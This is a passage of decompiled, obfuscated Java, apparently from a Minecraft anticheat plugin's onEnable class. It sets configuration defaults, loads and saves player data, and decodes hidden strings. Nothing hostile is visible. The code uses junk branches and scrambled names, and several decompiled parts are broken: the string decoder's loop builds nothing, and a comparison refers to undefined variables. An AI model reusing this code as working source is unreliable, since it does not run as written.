      config.addDefault(lIlIll[lIIllII[64]], Boolean.valueOf(lIIllII[0]));
      config.addDefault(lIlIll[lIIllII[65]], Integer.valueOf(lIIllII[26]));
      config.addDefault(lIlIll[lIIllII[66]], Integer.valueOf(lIIllII[47]));
      config.addDefault(lIlIll[lIIllII[67]], Boolean.valueOf(lIIllII[1]));
      config.addDefault(lIlIll[lIIllII[68]], Boolean.valueOf(lIIllII[0]));
      config.addDefault(lIlIll[lIIllII[69]], Integer.valueOf(lIIllII[26]));
      config.addDefault(lIlIll[lIIllII[70]], Integer.valueOf(lIIllII[47]));
      config.addDefault(lIlIll[lIIllII[71]], Boolean.valueOf(lIIllII[1]));
      config.addDefault(lIlIll[lIIllII[72]], Boolean.valueOf(lIIllII[0]));
      config.addDefault(lIlIll[lIIllII[73]], Integer.valueOf(lIIllII[26]));
      config.addDefault(lIlIll[lIIllII[74]], Integer.valueOf(lIIllII[47]));
      config.addDefault(lIlIll[lIIllII[75]], Boolean.valueOf(lIIllII[1]));
      config.addDefault(lIlIll[lIIllII[76]], Boolean.valueOf(lIIllII[0]));
      config.addDefault(lIlIll[lIIllII[77]], Integer.valueOf(lIIllII[51]));
      config.addDefault(lIlIll[lIIllII[78]], Integer.valueOf(lIIllII[47]));
      config.addDefault(lIlIll[lIIllII[79]], Boolean.valueOf(lIIllII[1]));
      config.addDefault(lIlIll[lIIllII[80]], Boolean.valueOf(lIIllII[0]));
      config.addDefault(lIlIll[lIIllII[81]], Integer.valueOf(lIIllII[2]));
      config.addDefault(lIlIll[lIIllII[82]], Integer.valueOf(lIIllII[47]));
      config.addDefault(lIlIll[lIIllII[83]], Boolean.valueOf(lIIllII[1]));
      config.addDefault(lIlIll[lIIllII[84]], Boolean.valueOf(lIIllII[0]));
      config.addDefault(lIlIll[lIIllII[85]], Integer.valueOf(lIIllII[5]));
      config.addDefault(lIlIll[lIIllII[86]], Integer.valueOf(lIIllII[47]));
      "".length();
      saveConfig();
      "".length();
      if ((0x73 ^ 0x30 ^ 0x1C ^ 0x5A) <= 0)
        return; 
    } catch (FileNotFoundException llllIIIIIIIIIII) {
      llllIIIIIIIIIII.printStackTrace();
      "".length();
      if ((117 + 59 - 160 + 151 ^ 60 + 105 - 79 + 77) < (47 + 163 - 172 + 129 ^ 27 + 99 - -32 + 5))
        return; 
    } catch (IOException lllIlllllllllll) {
      lllIlllllllllll.printStackTrace();
      "".length();
      if (((0x46 ^ 0x51) & (0x20 ^ 0x37 ^ 0xFFFFFFFF)) > 0)
        return; 
    } catch (InvalidConfigurationException lllIllllllllllI) {
      lllIllllllllllI.printStackTrace();
    } 
  }
  
  private static void loadData() {
    try {
      Core.notify = (ArrayList)SLAPI.load(String.valueOf((new StringBuilder(lIlIll[lIIllII[20]])).append(plugin.getDescription().getName()).append(lIlIll[lIIllII[21]])));
      "".length();
      if (((0x5 ^ 0x19 ^ 0xB2 ^ 0x97) & (0x17 ^ 0x33 ^ 0x64 ^ 0x79 ^ -" ".length())) != 0)
        return; 
    } catch (Exception exception) {}
    createUserData();
  }
  
  private static void loadUserYamls() {
    try {
      playerData.load(data);
      "".length();
      if (null != null)
        return; 
    } catch (FileNotFoundException lllIllllllllIll) {
      lllIllllllllIll.printStackTrace();
      "".length();
      if ("   ".length() == -" ".length())
        return; 
    } catch (IOException lllIllllllllIlI) {
      lllIllllllllIlI.printStackTrace();
      "".length();
      if (-"  ".length() > 0)
        return; 
    } catch (InvalidConfigurationException lllIllllllllIIl) {
      lllIllllllllIIl.printStackTrace();
    } 
  }
  
  private static String lIllIlI(String lllIllllllIIIll, String lllIllllllIIIlI) {
    String str = new String(Base64.getDecoder().decode(lllIllllllIIIll.getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
    StringBuilder lllIllllllIIIIl = new StringBuilder();
    char[] lllIllllllIIIII = lllIllllllIIIlI.toCharArray();
    int lllIlllllIlllll = lIIllII[0];
    char[] arrayOfChar1 = str.toCharArray();
    int i = arrayOfChar1.length;
    int j = lIIllII[0];
    while (llIIIlII(j, i)) {
      char lllIllllllIIlII = arrayOfChar1[j];
      "".length();
      lllIlllllIlllll++;
      j++;
      "".length();
      if (((0x5 ^ 0x4E ^ 0xBC ^ 0xAE) & (0x2 ^ 0x72 ^ 0x4D ^ 0x64 ^ -" ".length())) != 0)
        return null; 
    } 
    return String.valueOf(lllIllllllIIIIl);
  }
  
  public static void savePlayerData() {
    try {
      playerData.save(data);
      "".length();
      if (null != null)
        return; 
    } catch (IOException lllIlllllllIllI) {
      lllIlllllllIllI.printStackTrace();
    } 
  }
  
  private static boolean llIIIlII(int lllIllllIlllIIl, int lllIllllIlllIII) {
    return (SYNTHETIC_LOCAL_VARIABLE_0 < SYNTHETIC_LOCAL_VARIABLE_1);
  }
  
  static {
    lIllllIl();
    lIllIlII();
  }
}


/* Location:              C:\Users\J\Desktop\AVM.jar!\core\anticheat\api\onEnable.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */